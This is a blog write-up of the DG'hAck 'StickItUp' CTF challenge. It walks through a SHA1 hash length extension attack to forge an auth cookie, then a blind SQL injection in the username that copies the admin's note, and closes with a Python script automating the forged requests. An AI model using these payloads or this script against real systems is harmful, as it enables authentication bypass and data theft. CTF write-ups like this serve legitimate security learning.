<!doctype html><html lang=en><head><title>Writeup DG'hAck: StickItUp :: Nicolas Bourras</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="When starting this challenge, we&amp;rsquo;re greeted by two forms, a login one and a registration one. Registering for an account allows us to login, which brings us to this dashboard:
We&amp;rsquo;re asked to find a note created by the admin user. I started by trying a few SQLi on the login page (they didn&amp;rsquo;t work), and noticed this in the source code:
&amp;lt;!-- $_COOKIES[&amp;#39;auth&amp;#39;] = &amp;#39;testuser:&amp;#39; . sha1(SECRET_KEY . &amp;#39;testuser&amp;#39;); --&amp;gt; So the auth cookie format is username:hash, where the hash is a SHA1 of a secret plus the username."><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://nicolasb.fr/blog/writeup-dghack-stickitup/><link rel=stylesheet href=https://nicolasb.fr/assets/style.css><link rel=stylesheet href=https://nicolasb.fr/assets/pink.css><link rel=apple-touch-icon href=https://nicolasb.fr/img/apple-touch-icon-192x192.png><link rel="shortcut icon" href=https://nicolasb.fr/img/favicon/pink.png><meta name=twitter:card content="summary"><meta name=twitter:creator content><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Writeup DG'hAck: StickItUp"><meta property="og:description" content="When starting this challenge, we&amp;rsquo;re greeted by two forms, a login one and a registration one. Registering for an account allows us to login, which brings us to this dashboard:
We&amp;rsquo;re asked to find a note created by the admin user. I started by trying a few SQLi on the login page (they didn&amp;rsquo;t work), and noticed this in the source code:
&amp;lt;!-- $_COOKIES[&amp;#39;auth&amp;#39;] = &amp;#39;testuser:&amp;#39; . sha1(SECRET_KEY . &amp;#39;testuser&amp;#39;); --&amp;gt; So the auth cookie format is username:hash, where the hash is a SHA1 of a secret plus the username."><meta property="og:url" content="https://nicolasb.fr/blog/writeup-dghack-stickitup/"><meta property="og:site_name" content="Nicolas Bourras"><meta property="og:image" content="https://nicolasb.fr/img/favicon/pink.png"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2020-11-30 11:26:24 +0100 CET"></head><body class=pink><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>Nicolas Bourras</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/>About</a></li><li><a href=/blog>Blog</a></li><li><a href=/recipes>Recipes</a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/>About</a></li><li><a href=/blog>Blog</a></li><li><a href=/recipes>Recipes</a></li></ul></nav></header><div class=content><div class=post><h1 class=post-title><a href=https://nicolasb.fr/blog/writeup-dghack-stickitup/>Writeup DG&rsquo;hAck: StickItUp</a></h1><div class=post-meta><span class=post-date>2020-11-30</span></div><span class=post-tags>#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
#<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
#<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
#<a href=https://nicolasb.fr/tags/dghack/>dghack</a>&nbsp;</span><div class=post-content><div><p>When starting this challenge, we&rsquo;re greeted by two forms, a login one and a registration one. Registering for an account allows us to login, which brings us to this dashboard:</p><p><a href=/assets/dghack/stick-it-up-dashboard.png><img src=/assets/dghack/stick-it-up-dashboard.png alt="The dashboard"></a></p><p>We&rsquo;re asked to find a note created by the <code>admin</code> user. I started by trying a few SQLi on the login page (they didn&rsquo;t work), and noticed this in the source code:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;!--</span> $_COOKIES[<span style=color:#e6db74>&#39;auth&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;testuser:&#39;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>sha1</span>(<span style=color:#a6e22e>SECRET_KEY</span> <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;testuser&#39;</span>); <span style=color:#f92672>--&gt;</span>
</span></span></code></pre></div><p>So the <code>auth</code> cookie format is <code>username:hash</code>, where the hash is a SHA1 of a secret plus the username.</p><p>Now this <strong>should</strong> immediatly make you think of an <a href=https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks>hash key length extension attack</a>. It allows an attacker to append arbitrary data at the end of the hashed value.</p><p>Looking at the cookies, we do find the hash:</p><pre tabindex=0><code>test:14dc77bd8d95f3093afd7b8538a518ac17dcac14
</code></pre><p>Let&rsquo;s check that the attack is working, using the <a href=https://github.com/bwall/HashPump>hashpump tool</a>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ hashpump -s 14dc77bd8d95f3093afd7b8538a518ac17dcac14 -d test -a suffix -k <span style=color:#ae81ff>16</span>
</span></span><span style=display:flex><span>6cfe1c2b324630def13b186bb3f1c675e79d8c23
</span></span><span style=display:flex><span>test<span style=color:#ae81ff>\x</span>80<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>a0suffix
</span></span></code></pre></div><p>The first line is the new hash, the second is the updated data. I tried different keylengths before finding the right one. The cookie we have to set is:</p><pre tabindex=0><code>auth=test%C2%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C2%A0suffix%3A6cfe1c2b324630def13b186bb3f1c675e79d8c23
</code></pre><p><em>Warning: if you struggle to generate the cookie, be sure that you pasted the username correctly; for example in python use <code>b""</code> instead of <code>""</code>, or directly use the <code>hashpumpy</code> module.</em></p><p>After a quick reload, we see:</p><p><a href=/assets/dghack/stick-it-up-edited-username.png><img src=/assets/dghack/stick-it-up-edited-username.png alt="The edited username seen when logging in"></a></p><p>Which confirms that the exploit is working. For the next part, we have to notice this message on the registration form:</p><p><a href=/assets/dghack/stick-it-up-only-letters-numbers.png><img src=/assets/dghack/stick-it-up-only-letters-numbers.png alt="The registration form"></a></p><p>While it&rsquo;s not unusual for the charset of a username to be restricted, in our case we&rsquo;re free to add any character that we want. It&rsquo;s worth a shot to try an SQLi.</p><p>After adding a single quote to the username, we can&rsquo;t create notes anymore. This is a blind SQLi!</p><p>To help create a payload, we can guess both the table name and structure, as well as the query:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>CREATE</span> <span style=color:#66d9ef>TABLE</span> note (
</span></span><span style=display:flex><span>    username text,
</span></span><span style=display:flex><span>    title text,
</span></span><span style=display:flex><span>    content text
</span></span><span style=display:flex><span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>-- Add a sample flag.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>INSERT</span> <span style=color:#66d9ef>INTO</span> note <span style=color:#66d9ef>VALUES</span> (<span style=color:#e6db74>&#34;admin&#34;</span>, <span style=color:#e6db74>&#34;flag&#34;</span>, <span style=color:#e6db74>&#34;flag&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>-- This is the query we&#39;re trying to break.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>INSERT</span> <span style=color:#66d9ef>INTO</span> notes <span style=color:#66d9ef>VALUES</span> (username, <span style=color:#e6db74>&#34;title&#34;</span>, <span style=color:#e6db74>&#34;content&#34;</span>);
</span></span></code></pre></div><p><a href=http://sqlfiddle.com>SQL Fiddle</a> was of great help. The injection we can find, after a few attempts, is:</p><pre tabindex=0><code>&#34;,&#34;&#34;,&#34;&#34;), (&#34;test&#34;, &#34;flag&#34;, (select content from note a limit 1))#
</code></pre><p>Note the table alias, which I forgot to add for quite a while. The injection works by inserting a second row, in the account that we want, with the first note in the table.</p><p>After creating the updated username and hash, logging in with the forged cookie, and attempting to create a note, we switch to the <code>test</code> account, and see:</p><p><a href=/assets/dghack/stick-it-up-flag.png><img src=/assets/dghack/stick-it-up-flag.png alt="The note of the test user"></a></p><p>Here we go, the flag is <code>-+-{{akUX7Aihx9}}-+-</code>.</p><hr><p>Bonus: the script I used to easily try different SQLi:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> hashpumpy
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> urllib.parse
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>DATA <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;test&#34;</span>
</span></span><span style=display:flex><span>SIGNATURE <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;14dc77bd8d95f3093afd7b8538a518ac17dcac14&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>suffix <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>new_signature, new_string <span style=color:#f92672>=</span> hashpumpy<span style=color:#f92672>.</span>hashpump(SIGNATURE, DATA, suffix, <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>cookie <span style=color:#f92672>=</span> urllib<span style=color:#f92672>.</span>parse<span style=color:#f92672>.</span>quote(new_string <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;:&#34;</span> <span style=color:#f92672>+</span> new_signature<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>requests<span style=color:#f92672>.</span>post(
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;http://stickitup.chall.malicecyber.com/notes.php&#34;</span>,
</span></span><span style=display:flex><span>    data<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;title&#34;</span>: <span style=color:#e6db74>&#34;test&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;text&#34;</span>: <span style=color:#e6db74>&#34;test&#34;</span>,
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>    cookies<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;auth&#34;</span>: cookie,
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>)
</span></span></code></pre></div><hr><p><a href=/tags/dghack>View all of the DG&rsquo;hAck articles</a>.</p></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://nicolasb.fr/blog/writeup-dghack-time-for-something-different/><span class=button__icon>←</span>
<span class=button__text>Writeup DG'hAck: Time for Something Different</span></a></span>
<span class="button next"><a href=https://nicolasb.fr/blog/writeup-dghack-bwing/><span class=button__text>Writeup DG'hAck: Bwing</span>
<span class=button__icon>→</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2022 Powered by <a href=http://gohugo.io>Hugo</a></span>
<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://nicolasb.fr/assets/main.js></script>
<script src=https://nicolasb.fr/assets/prism.js></script></div></body></html>